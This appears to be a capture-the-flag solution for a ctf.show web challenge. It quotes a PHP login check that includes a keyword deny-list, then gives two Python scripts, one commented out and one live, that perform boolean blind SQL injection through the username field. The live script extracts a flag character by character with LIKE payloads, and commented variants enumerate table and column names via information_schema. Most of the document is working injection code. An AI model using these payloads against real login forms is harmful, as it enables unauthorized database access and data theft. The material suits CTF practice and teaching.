'''
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

    if(preg_match('/file|into|ascii|ord|hex|substr/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }

'''

# @Author:Y4tacker
import requests
import string

# url = "http://5125a841-bdea-488b-85a7-ec6adbe8be70.chall.ctf.show:8080/api/index.php"
# flagstr = " _{}-" + string.ascii_lowercase + string.digits
# flag = ''
# for i in range(1, 45):
#     for j in flagstr:
#         payload = f"admin' and (select group_concat(f1ag) from ctfshow_flxg)regexp('{j}')-- -"
#         data = {
#             'username': payload,
#             'password': '1'
#         }
#         r = requests.post(url, data=data)
#         if "密码错误" == r.json()['msg']:
#             flag += j
#             print(f'i={i}, j={j}')
#             print(flag)
#             if "}" == j:
#                 exit(0)
#             break
# error


# @Author:feng

url = 'http://5125a841-bdea-488b-85a7-ec6adbe8be70.chall.ctf.show:8080/api/index.php'
flag = ""
for i in range(0, 100):
    for j in "0123456789abcdefghijklmnopqrstuvwxyz-,{}_":
        # payload="' or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like '{}',1,0)-- -".format(flag+j+"%")
        # payload="' or if((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg') like '{}',1,0)-- -".format(flag+j+"%")
        payload = "' or if((select group_concat(f1ag) from ctfshow_flxg) like '{}',1,0)-- -".format(flag + j + "%")

        data = {
            'username': payload,
            'password': 1
        }
        # print(payload)
        r = requests.post(url=url, data=data)
        # print(payload)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            flag += j
            print(flag)
            if j == '}':
                exit()
            break
